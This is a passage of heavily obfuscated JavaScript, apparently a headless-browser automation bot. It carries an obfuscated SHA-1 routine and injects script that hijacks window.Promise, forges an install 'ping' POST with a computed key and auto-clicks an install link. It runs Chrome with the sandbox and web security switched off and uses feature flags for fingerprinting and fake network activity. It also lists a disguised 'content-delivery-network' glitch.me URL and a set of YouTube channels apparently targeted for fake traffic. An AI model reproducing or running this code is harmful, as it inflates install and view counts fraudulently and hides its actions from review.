-0x1413] |= (-0xd * 0x45 + 0xf50 + -0xf * 0xc1 | L >> 0x255b + -0x37e * 0x1 + 0xb * -0x313 & 0x23e5 + -0x5 * -0x55 + -0x1 * 0x254f) << y[0x1dab + -0x92 * -0x2b + 0x5 * -0xad6 & N++], P[N >> -0x15c9 + -0x4 * 0xfa + -0x9 * -0x2db] |= (0x1ab7 + 0x22 * 0x31 + -0x1 * 0x20b9 | L >> 0x442 + 0x49f + -0x8db & 0x14b1 * -0x1 + -0x52 * -0xd + 0x13 * 0xe2) << y[0x989 + 0x167c + -0x2002 & N++], P[N >> 0xccd + 0x120f + -0x1eda] |= (-0x887 + 0x1df2 + -0x9 * 0x253 | 0x479 + -0x25 * 0xe0 + 0x1c26 & L) << y[-0x79f * -0x5 + -0x9ef * -0x1 + -0x99b * 0x5 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1057 + 0x1 * -0x82 + -0x5b3 * -0x3 ? (this['block'] = P[0x40d * 0x2 + 0x35b * 0x7 + -0x481 * 0x7], this['start'] = N - (0x13d * -0xf + 0x2140 + -0xe6d), this['hash'](), this['hashed'] = -0x1581 * 0x1 + -0x1c1c + -0x1b6 * -0x1d) : this['start'] = N;
                }
                return this['bytes'] > -0x99a47290 + 0x1 * -0x1bcb17b4f + -0x9 * -0x5eed1a6e && (this['hBytes'] += this['bytes'] / (-0x1b8e87210 + 0x62 * 0x39e6304 + 0x156468a88) << -0x1 * -0x34b + -0xbb4 + 0x869, this['bytes'] = this['bytes'] % (-0x2c99d9e8 + 0x2c1e * 0x465d2 + 0x6a95d34c)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x1a5 * 0x5 + -0x98d + 0x155;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x1a42 + 0x1 * -0x78e + 0x21e0] = this['block'], J[K >> -0x2 * 0x344 + 0xb3d + -0x4b3] |= x[0xa75 + 0x4f4 * 0x6 + -0x282a & K], this['block'] = J[0x2c * 0xe3 + -0x1c1b * -0x1 + -0x430f * 0x1], K >= -0x1a8f * -0x1 + -0x671 * -0x4 + -0x341b && (this['hashed'] || this['hash'](), J[0x23e0 + 0x1094 + 0x175 * -0x24] = this['block'], J[-0x61a + -0x3b * 0x8b + 0x7 * 0x575] = J[-0x3b1 * -0x5 + 0xda * -0xa + -0x9f0] = J[0x35c + 0x3 * -0x15d + 0x1 * 0xbd] = J[0x1 * 0x1609 + -0x1258 * -0x2 + -0x3ab6] = J[-0x167 * -0xe + 0x24a7 * -0x1 + 0x31 * 0x59] = J[-0xf89 + -0x12da * -0x1 + -0x2 * 0x1a6] = J[0x9c3 + -0x22c9 + -0xc86 * -0x2] = J[-0x2590 + -0x1e9 * 0x8 + 0x34df] = J[0x943 + -0x2a5 * 0xe + -0x1bcb * -0x1] = J[0x1 * 0x7d8 + 0xce3 * -0x1 + 0xd * 0x64] = J[-0x1fcc + -0x2a5 * -0xd + -0x5d * 0x7] = J[0x7 * -0x4ac + -0x1 * 0xdbf + -0x1 * -0x2e7e] = J[0x7ce + -0x2 * 0x767 + 0x70c] = J[-0x775 * -0x1 + -0x8f5 * -0x1 + -0x3b * 0x47] = J[-0x1 * -0xc77 + -0x1 * -0x1786 + -0x23ef] = J[-0xf9b * 0x2 + 0x223d + -0x2f8] = -0x1 * 0xa1d + 0x5c * -0x8 + 0xcfd), J[-0x206b + -0x3 * 0x8ac + 0x3 * 0x137f] = this['hBytes'] << -0x5 * -0x52e + -0x67 * 0x1a + -0xf6d | this['bytes'] >>> -0x1 * -0x2677 + 0x24a6 * -0x1 + -0x4 * 0x6d, J[-0x30f * -0x6 + 0x2500 + -0x5 * 0xb0f] = this['bytes'] << -0x52a + -0x1cf7 + 0x889 * 0x4, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1cfa * -0x1 + 0x1 * -0x1a39 + 0x3743; J < 0xa6b + 0x620 + 0x569 * -0x3; ++J)
                K = Q[J - (-0x2c3 + -0xeda * 0x1 + 0x11a0)] ^ Q[J - (0x1e8c + 0x2 * 0x49f + -0x27c2)] ^ Q[J - (-0x12aa + 0x43d * 0x4 + -0x1c4 * -0x1)] ^ Q[J - (0xa99 + 0x1862 + -0x22eb)], Q[J] = K << 0x200a * -0x1 + 0x2653 * 0x1 + -0x648 * 0x1 | K >>> 0x1bd0 + -0x12c0 + -0x2fb * 0x3;
              for (J = 0x317 * 0x1 + 0x8cc + 0xb3 * -0x11; J < 0xe * 0x23 + -0x1d9a + -0x2 * -0xde2; J += 0xd3f + -0x220f * -0x1 + -0x1 * 0x2f49)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2587 + -0x22 * -0x1a + 0x4 * 0x886 | L >>> -0xbdb + 0x1b * -0xb + 0x1 * 0xd1f) + (M & N | ~M & O) + P + (-0x3fb151 * 0x57 + -0x233 * 0x4f4a8b + -0x1 * -0x11e88abd1) + Q[J] << -0x1 * 0x127d + -0x1dd7 + -0x3054 * -0x1) << -0x55c + 0x1fe8 + -0x1a87 | P >>> 0x228f + 0x1 * -0x2054 + -0x220) + (L & (M = M << 0x21f7 + 0x10a * -0x10 + 0x1 * -0x1139 | M >>> -0x1185 + -0xd2 * 0x22 + 0x2d6b) | ~L & N) + O + (-0x88ca0391 + 0x40bb2b * -0x29 + 0xedaa770d) + Q[J + (-0x10 * 0x1c1 + -0x753 + 0x2364)] << 0x1910 + -0x74b * 0x2 + -0xa7a) << -0x1c6 * -0x1 + -0x4 * 0x943 + 0x234b * 0x1 | O >>> -0xa3c * -0x3 + 0xaec + -0x2985) + (P & (L = L << -0x1714 + -0x96 * -0x30 + -0x4ee * 0x1 | L >>> -0x305 * 0x2 + -0xf60 + 0x724 * 0x3) | ~P & M) + N + (0x2bcf28a9 + -0x15d4f * 0x446b + 0x8c0e4cf5) + Q[J + (0x1971 + -0x1daf + 0x440)] << 0x188e + 0x1 * 0x1b88 + -0x3416) << 0x5 * -0x3fb + -0x10e * 0xd + 0x21a2 | N >>> 0xebf + 0x105e + -0x1f02) + (O & (P = P << -0xae3 + 0x416 * -0x4 + 0x1b59 * 0x1 | P >>> -0x4c1 * -0x2 + -0x18b7 + 0x29 * 0x5f) | ~O & L) + M + (-0x127 * -0x9799fd + -0x653de372 + 0xe8 * 0x12d190) + Q[J + (-0x22d0 + -0x1d6a * -0x1 + -0x115 * -0x5)] << -0x1f2b * -0x1 + -0x9 * 0x61 + 0x286 * -0xb) << 0x2f * 0x2f + 0x14aa + 0x3 * -0x9c2 | M >>> 0x2190 + -0xbe7 * 0x2 + -0x9a7) + (N & (O = O << 0x177 * 0x15 + 0x1 * -0x22ed + 0x89 * 0x8 | O >>> -0x15f3 + 0xcba + -0x8b * -0x11) | ~N & P) + L + (0x52348d22 + -0x9ddb5ab7 + 0xa629472e) + Q[J + (0x6ea + 0x26a3 + -0x2d89)] << 0x61d * -0x5 + 0x66 * 0x12 + 0x1765, N = N << 0x38f * -0x7 + -0x16af + 0x2fb6 | N >>> -0x2 * 0xbb9 + -0x4f7 * -0x2 + 0xd86;
              for (; J < 0xac0 * -0x1 + 0xa31 + 0xb7; J += -0x239 * -0x1 + 0x1422 * 0x1 + -0x2 * 0xb2b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2429 + -0x1 * 0x1274 + 0x36a2 | L >>> -0x75b + 0x189e + 0x18 * -0xb7) + (M ^ N ^ O) + P + (0x8a657 * -0x984 + -0x1 * -0xcf0a25a8 + -0x24a20b * 0x61) + Q[J] << -0x8 * 0x167 + 0x9 * 0xe9 + 0x307) << 0x193a * 0x1 + -0x9b5 + -0xf80 | P >>> -0x1957 + 0xaaf + 0xec3) + (L ^ (M = M << 0x6e6 * -0x2 + -0x1af8 + 0x28e2 | M >>> -0x157 * -0x3 + -0x1383 + 0x7c0 * 0x2) ^ N) + O + (-0x86c3 * -0x18525 + -0x12916 * 0x93e6 + 0x2 * 0x26d1571b) + Q[J + (-0x26f9 + -0x1 * 0x1045 + -0x1 * -0x373f)] << 0x3 * -0x3d7 + -0x21d9 * 0x1 + -0x1 * -0x2d5e) << 0x1a6b * -0x1 + -0x2361 * -0x1 + -0x1 * 0x8f1 | O >>> 0x71c + -0x609 + -0xf8 * 0x1) + (P ^ (L = L << -0x1d32 + 0x4 * -0x46b + 0x177e * 0x2 | L >>> -0x134b * -0x1 + 0x2355 + 0x2 * -0x1b4f) ^ M) + N + (-0x615e * 0x1196 + 0x3c02b57b + -0x9cacf3 * -0x5e) + Q[J + (-0x1c2c + 0x259d + -0x96f)] << -0x2 * -0xd40 + 0x1518 + -0x4 * 0xbe6) << -0x9ac * -0x2 + -0x1659 + 0x306 | N >>> 0x609 + 0x1 * -0x1468 + -0x6d * -0x22) + (O ^ (P = P << -0x1 * 0x26a1 + -0x1001 + 0x2 * 0x1b60 | P >>> -0xd83 + -0x1 * -0x17b1 + -0x2 * 0x516) ^ L) + M + (0x1 * 0x5bb3238f + 0x679849f1 + 0x1c25d5f5 * -0x3) + Q[J + (-0x1fc1 + -0xe5c + 0x5c4 * 0x8)] << 0x3a * 0x60 + -0x9 * -0xe + -0x163e) << 0x24bc + 0x920 + 0x1 * -0x2dd7 | M >>> 0x1 * 0xd06 + -0x4 * 0x19e + -0x673) + (N ^ (O = O << -0x183f + -0x17c8 + 0x3025 | O >>> -0x1c73 + -0x5e2 * 0x6 + -0x13 * -0x35b) ^ P) + L + (-0x33431fd5 * 0x1 + 0x1e * -0x32754eb + -0xa44d70 * -0x190) + Q[J + (0x25 * -0x89 + -0x2379 * 0x1 + 0x374a)] << 0x5 * 0x6be + -0x955 * -0x1 + -0x2b0b * 0x1, N = N << 0x1393 + 0x7 * 0x37 + 0xa7b * -0x2 | N >>> -0x121d + -0x16b4 + -0x5d5 * -0x7;
              for (; J < -0x1d * -0x119 + 0x3c7 * 0x3 + -0xe * 0x311; J += 0x2a * 0x21 + -0x19 * 0x157 + 0x2 * 0xe0d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x5d4 + -0x1274 + 0x3 * 0x437 | L >>> -0x2551 * -0x1 + 0x1 * -0x2507 + -0x2f) + (M & N | M & O | N & O) + P - (0x1345d * 0xa3c3 + 0x80a9ef67 + 0x613e * -0x230d3) + Q[J] << 0x2 * 0xd2d + -0x168b + -0x1 * 0x3cf) << -0xa * -0x115 + -0x665 * 0x1 + 0x4 * -0x11a | P >>> -0x1ec1 * -0x1 + -0x49 * -0x4 + -0x1fca) + (L & (M = M << -0xeb5 + 0x1cc2 + -0xdef | M >>> -0x24e * -0xe + -0x2d * 0xdb + 0x63d * 0x1) | L & N | M & N) + O - (-0x4602a * -0x1d11 + -0x93192246 + 0x1 * 0x84ce40a0) + Q[J + (-0xacb + 0x1 * 0xc5f + -0xd * 0x1f)] << 0x1318 + -0x3ea * -0x8 + -0x3268) << 0x1 * 0x1dc2 + -0x4ba * 0x6 + 0x161 * -0x1 | O >>> 0x244d * -0x1 + -0x1f03 + 0x621 * 0xb) + (P & (L = L << 0x48f * 0x7 + -0x12de * 0x2 + 0x5f1 | L >>> -0x1331 + -0x490 + 0x365 * 0x7) | P & M | L & M) + N - (0x527d * -0xdeb + -0x95aa0843 + 0x2be80e * 0x615) + Q[J + (-0x2030 + 0x2038 + -0x1 * 0x6)] << 0x2619 + -0x1 * 0x1d41 + -0x8d8) << -0x20d + 0x1129 + -0xf17 | N >>> -0x1ca5 + 0x1 * 0x1837 + -0x81 * -0x9) + (O & (P = P << 0x1e17 + -0x2 * 0xd90 + -0xf3 * 0x3 | P >>> 0xd * 0x2e3 + 0x11ee + -0xb17 * 0x5) | O & L | P & L) + M - (0x391d7aa9 + 0x254 * -0x2ae1d1 + 0x1280b7 * 0x869) + Q[J + (-0x1 * 0x158d + 0x34 * 0x85 + -0x574)] << 0x1 * 0x9fd + 0x8ff + -0x36 * 0x5a) << -0x1524 + -0x1 * 0x33 + 0x155c | M >>> 0x5 * 0x291 + -0x137 * -0x1e + -0x312c) + (N & (O = O << 0x12 * 0x1f2 + 0x5 * -0x3bc + -0x103a | O >>> -0x14b * -0x1 + -0x80a + 0x6c1) | N & P | O & P) + L - (0x1 * 0x11d84b89 + 0x6bc7920d + -0xcbb9a72) + Q[J + (-0x1bc6 + 0x1e11 + -0x35 * 0xb)] << 0x7 * -0x3f7 + 0x1f2f + -0x36e, N = N << -0x16 * -0xe9 + 0x164 * 0x18 + -0x28 * 0x155 | N >>> 0x1 * 0x1f3f + 0xf7 * -0x11 + -0xed6;
              for (; J < -0xbd2 + -0x62b + 0x124d; J += -0x1055 + -0x2 * -0x1003 + -0xfac)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1f8d * -0x1 + -0xe9c + 0x1717 * 0x2 | L >>> 0x1590 + 0x3 * -0x784 + 0x117) + (M ^ N ^ O) + P - (0x136b822 * -0x13 + -0x3cd1b * 0x832 + 0x5de3f9 * 0x126) + Q[J] << 0x16b * -0xf + 0x1889 + 0xb * -0x4c) << -0x1 * -0x45d + 0x2196 + -0x25ee | P >>> 0x12bd + -0x1f0c + 0xc6a) + (L ^ (M = M << -0x2 * 0x559 + -0x1 * 0x2636 + 0x1 * 0x3106 | M >>> -0x16 * 0x1e + -0x2462 + 0x26f8) ^ N) + O - (0x75600fd * -0xb + -0x27e97409 + 0x1 * 0xae38bd12) + Q[J + (0x4 * -0x174 + -0x756 + 0xd27)] << -0x11e8 * 0x2 + -0x209 + 0x25d9) << 0x1 * 0x1b15 + -0x1 * -0x7dc + -0x1bf * 0x14 | O >>> 0x9d3 * -0x3 + 0x2685 * 0x1 + -0x8f1) + (P ^ (L = L << -0x1a5 * 0xf + -0x2 * 0x106f + 0x39a7 | L >>> -0xf84 + -0x201f + 0x2fa5 * 0x1) ^ M) + N - (0x63a69c04 + -0x64fa6ad + 0x17 * -0x1ba295b) + Q[J + (0xf4 * 0x17 + 0x429 + -0x3 * 0x8b1)] << 0xcdf + 0x7 * 0x39d + -0x262a) << -0x25 * 0x43 + 0x679 * -0x5 + 0x2a11 | N >>> 0x14f4 + -0x1656 + 0x17d) + (O ^ (P = P << 0x2d7 * 0xc + -0x23dd + 0x1e7 | P >>> -0x71 * 0x27 + -0x22c3 + 0x33fc) ^ L) + M - (-0x1 * -0x26c5aac1 + -0x9ea5a1 * 0x8b + -0x233 * -0x2deadc) + Q[J + (-0x1fbb + -0xc5a * -0x1 + 0x44 * 0x49)] << -0x1d2e + -0x1 * -0x16b5 + 0x1 * 0x679) << 0x1 * 0x60f + 0x593 * -0x2 + 0x51c | M >>> 0x164f + 0x8 * -0xd3 + 0x36 * -0x4a) + (N ^ (O = O << 0x1 * 0x32b + -0xd17 * -0x1 + -0x1024 | O >>> 0xb15 + 0x23d4 + -0x2ee7 * 0x1) ^ P) + L - (0x7a8735 * -0x3e + 0x46657b38 * 0x1 + 0xec * 0xdfc36) + Q[J + (-0x2561 + 0x52 * -0x56 + -0x23 * -0x1db)] << -0xb7 * 0x2a + 0x1 * -0x85d + 0x2663, N = N << 0x58e + 0xedf + -0x144f | N >>> -0x756 + 0xb9f + -0x447;
              this['h0'] = this['h0'] + L << 0x15a * 0x7 + -0x1a68 + 0x10f2, this['h1'] = this['h1'] + M << -0x3 * 0x960 + 0x1c66 + -0x1 * 0x46, this['h2'] = this['h2'] + N << -0xdfd + -0x10c9 * -0x1 + 0xb3 * -0x4, this['h3'] = this['h3'] + O << 0x1534 + 0x929 + -0x1e5d, this['h4'] = this['h4'] + P << -0x1814 + -0x136d * 0x1 + 0x7 * 0x637;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0xb3f + 0x1b5c + -0x1001 & -0x1844 + 0x1c80 + 0x42d * -0x1] + w[J >> 0x15c3 + 0xf72 + -0xc5f * 0x3 & -0x313 * -0xb + -0x3 * -0x624 + -0x342e] + w[J >> -0x13dd + 0x213f + -0xd * 0x106 & -0x25 * -0x2f + 0x145b + -0x56b * 0x5] + w[J >> 0x15c * 0x1 + 0x7ed + -0x939 & 0x241a * -0x1 + 0x194a + -0x79 * -0x17] + w[J >> -0x45d + 0x215f + -0x1cf6 & -0xc16 + 0x1ca1 * -0x1 + -0x1463 * -0x2] + w[J >> 0x23c + 0x1b28 + -0x4 * 0x757 & -0xb6e + 0x23bd + -0x1840] + w[J >> 0x6f * -0x55 + -0x29 * 0x59 + 0x10 * 0x332 & -0x53 * 0x75 + -0x1770 + 0x3 * 0x147a] + w[-0xe2f + -0x1 * -0x234b + -0x150d & J] + w[K >> -0x172 * 0x10 + -0x22 * 0xdb + 0x3452 & 0xc5 * 0x11 + -0x17cc + 0x18a * 0x7] + w[K >> -0x24e9 + 0x1899 + 0xc68 & 0x2636 + 0x763 * 0x1 + -0x3 * 0xf2e] + w[K >> 0x1556 + -0x1165 + -0x3dd & 0xbd * 0x25 + -0xcf1 + -0xe51] + w[K >> -0x20b * 0x11 + -0x8cd * 0x1 + 0x3c * 0xba & -0x16 * 0xac + -0x1ebf + 0x2d96] + w[K >> 0x1 * -0x1281 + -0x1b1e + 0x2dab & -0xbe * -0x2a + 0x2245 + 0x1 * -0x4162] + w[K >> -0x7 * 0xbf + 0x7a4 + -0x263 & -0x1d9d + 0x1e5e + -0xb2] + w[K >> 0x5 * -0x47e + 0x107d + 0x3 * 0x1ff & 0xc53 + -0xc70 * 0x2 + 0xc9c] + w[0xf59 + 0x2301 + 0x324b * -0x1 & K] + w[L >> -0x1823 + 0x1371 + 0x4ce & -0x106c + -0xbac + 0x1c27] + w[L >> 0x286 + 0x17 * -0x3a + 0x2c8 & 0x99f * 0x3 + 0x12a2 + -0x2f70] + w[L >> 0xe92 + -0x949 * 0x4 + 0x16a6 * 0x1 & 0x16 * 0x8b + -0x16fe + -0x1 * -0xb1b] + w[L >> -0x1dca * -0x1 + 0x18d2 + -0x368c & 0x3 * 0xb99 + -0x1bb1 + -0x3 * 0x259] + w[L >> -0x976 * 0x3 + -0x54 * 0x1a + -0x127b * -0x2 & 0x3 * 0x59d + -0x47d * 0x1 + -0xc4b] + w[L >> 0xb73 * -0x3 + 0x14 * 0x1ba + 0xd * -0x3 & -0xe * -0xd6 + -0x246e + 0x18c9] + w[L >> 0x1 * 0x147b + -0xb5 * -0x19 + -0x2624 & -0x1ae + -0x2 * -0x239 + 0x63 * -0x7] + w[0x1 * -0x25b1 + 0x1619 + 0xfa7 & L] + w[M >> 0x1f2 + -0x3b9 * -0x9 + 0x1 * -0x2357 & -0x23f6 * -0x1 + -0x923 * -0x2 + 0x9 * -0x605] + w[M >> 0x1 * 0x2006 + -0xb0f * -0x2 + -0x360c & 0x1e44 * -0x1 + -0x2375 + 0x41c8] + w[M >> 0x1da0 + 0xe3 * 0x1 + -0x1e6f & 0x1703 * 0x1 + 0x1ef6 + -0x43 * 0xce] + w[M >> 0x13 * 0xc5 + -0x1 * 0x2 + 0x5 * -0x2e9 & 0x24 + 0x1f84 + -0x1f99] + w[M >> -0x2d * -0x4f + 0x1 * -0x1f85 + 0x3e * 0x49 & 0x1 * 0x15dc + 0x146 + -0x1713] + w[M >> -0x20d9 + -0x141c + 0x1 * 0x34fd & 0x1541 + 0x266 * -0x1 + 0xc * -0x191] + w[M >> -0x1f93 + -0x20b7 * 0x1 + -0x2027 * -0x2 & 0x32f * 0x7 + -0x1642 + -0x1 * -0x8] + w[0x5ba + 0x231 + 0x1f7 * -0x4 & M] + w[N >> 0x300 + 0x1f48 + -0x12 * 0x1e6 & -0x82 * -0x2b + -0x17cd + 0x206] + w[N >> -0x3 * -0xabf + 0xade + 0x2b03 * -0x1 & -0x6bf + 0x7c7 + -0xf9] + w[N >> -0x181 + -0x1432 + 0x19 * 0xdf & -0x2d * 0x9f + -0x11 * -0x86 + 0x131c] + w[N >> -0x599 * 0x5 + 0x10b4 + 0x53 * 0x23 & 0x29d + -0x156e + 0x970 * 0x2] + w[N >> 0x2516 + -0x5a * -0x1d + -0x2f3c & 0x1225 + -0x268d * -0x1 + -0x38a3] + w[N >> 0x12d8 + -0x217c + -0x1 * -0xeac & 0x11ae + -0x1bb4 + -0x59 * -0x1d] + w[N >> -0x2040 + -0x3 * -0xab5 + -0x1 * -0x25 & 0x724 * -0x1 + 0xa28 + -0x2f5] + w[0x1ddd + 0xa3 * 0x21 + -0x1 * 0x32d1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x2126 + -0x2016 + 0x25 * 0x1c4 & -0x2de * 0x1 + 0x609 + 0x1 * -0x22c,
                J >> 0xd2b + 0x13d6 + -0x20f1 & -0x4eb * -0x1 + 0x2508 + 0x4 * -0xa3d,
                J >> 0x1 * 0x190b + -0x7 * -0x526 + -0x3d0d & 0x7 * 0x6a + -0x80c + 0xd * 0x79,
                0x1 * 0x195e + 0x7 * 0x2c6 + -0x2bc9 & J,
                K >> -0x2132 + -0xd08 + 0x2e52 & 0x1 * 0x233f + 0x1352 + 0x1ac9 * -0x2,
                K >> 0x17f * 0x1 + -0x418 + -0x1 * -0x2a9 & -0xf7 * -0x5 + 0x1 * -0xab + 0x1 * -0x329,
                K >> -0x1301 + 0xc3b + 0x6ce & -0x2bd + -0xca6 + 0x9 * 0x1d2,
                -0x24b8 + -0x1ceb + 0x42a2 & K,
                L >> -0x15 * 0xd5 + 0x68 * -0x5c + 0x1 * 0x36f1 & 0xc5d + 0x2606 + -0x3164,
                L >> 0x20 * 0x51 + 0x27 * 0xd + -0xc0b & -0x8aa + -0x25ce + 0x2f77,
                L >> 0x138e * -0x1 + 0x7 * -0xec + -0x3 * -0x8ae & -0x1d * 0x19 + 0x175a + -0x1386,
                -0x1d * -0xbf + -0x53 * 0x3 + 0x5f * -0x35 & L,
                M >> 0x151 + -0x29c * 0x7 + -0x1 * -0x110b & 0x184 * 0xf + -0x97 * 0x3 + -0x13f8,
                M >> 0x524 * 0x6 + -0x1641 + -0x887 & 0x1447 + -0x2300 + -0x1 * -0xfb8,
                M >> -0xaa4 + -0xfb * -0x2 + -0xa * -0xdf & 0x2a4 * 0x8 + 0x1c93 + -0x30b4,
                0x492 * -0x5 + 0x1294 + 0x545 & M,
                N >> -0x84 * -0x16 + 0x1c8 * -0x2 + -0x7b0 & 0x2358 + -0x1fc3 + -0x296,
                N >> -0x1668 + -0x23c4 + -0x2 * -0x1d1e & 0x18c * -0x8 + 0xca1 * -0x3 + 0x2d9 * 0x12,
                N >> 0x100d + -0xc * 0x1f3 + 0x33 * 0x25 & -0x8 * 0x3e4 + -0x8d6 + 0x28f5,
                -0x1 * -0x1a06 + -0x1c21 + 0x31a & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1ebe + -0xa70 + -0x143a), (K = new DataView(J))['setUint32'](0x4 * -0x199 + 0x5 * -0x361 + 0x3 * 0x7c3, this['h0']), K['setUint32'](0x84d + -0xf * -0x1f7 + -0x25c2, this['h1']), K['setUint32'](0x13b * 0xe + 0x16 * 0x14b + 0xfe * -0x2e, this['h2']), K['setUint32'](-0x1bc7 + -0x30a * -0x6 + 0x997 * 0x1, this['h3']), K['setUint32'](-0x1546 + -0xb71 + 0x20c7 * 0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x3ee * -0x1 + 0x2 * 0x55d + 0xf * -0x74];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x1 * 0x8ed + -0x5 * -0x2ab + -0x1644;
            J[0xf85 + 0x115c + -0x1 * 0x20e1]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x25 * 0xe9 + -0x1ce9 + 0x262 * -0x2] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x8f1 * -0x2 + 0xd83 * 0x2 + -0x923), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1 * -0x136d + -0x20eb + 0xd7f;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1 * 0x255 + 0x1ba4 + -0x1373), Promise['resolve'](-0x220a + -0x1d54 + 0x3f5f);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1d93 + -0x1b3c + -0x257 * 0x1; j < -0x1 * 0x25c1 + 0x233 * 0x11 + 0x5f * 0x1; j++)
    i();
}
const NETWORK_PATIENCE = 0xfe * 0x3d + -0xa * 0x62f + 0x2090 + (0x65 * 0x11 + 0x1b1d + -0x161a) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x11 * -0xa6 + -0x17a1 * 0x1 + -0x22 * -0x5f) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x204f + -0x50 + 0x4a9 * 0x7; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const W = c;
    let i = this[floor(random() * this[W(0x4)])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
